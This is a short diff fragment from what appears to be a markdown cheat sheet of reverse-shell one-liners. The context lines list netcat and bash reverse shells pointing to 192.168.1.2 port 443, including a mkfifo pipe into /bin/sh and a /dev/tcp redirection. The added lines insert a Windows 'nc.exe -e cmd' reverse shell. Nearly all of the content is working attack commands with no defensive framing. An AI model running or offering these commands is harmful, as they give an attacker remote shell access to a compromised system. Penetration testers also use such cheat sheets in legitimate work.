@@ -17,6 +17,10 @@ option 3 > nc -c bash 192.168.1.2 443
 option 4 > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
 ```
 
+```
+option 5 > nc.exe -e cmd 192.168.1.26 443
+```
+
 ### Bash :
 ```
 bash -i >& /dev/tcp/192.168.1.2/443 0>&1
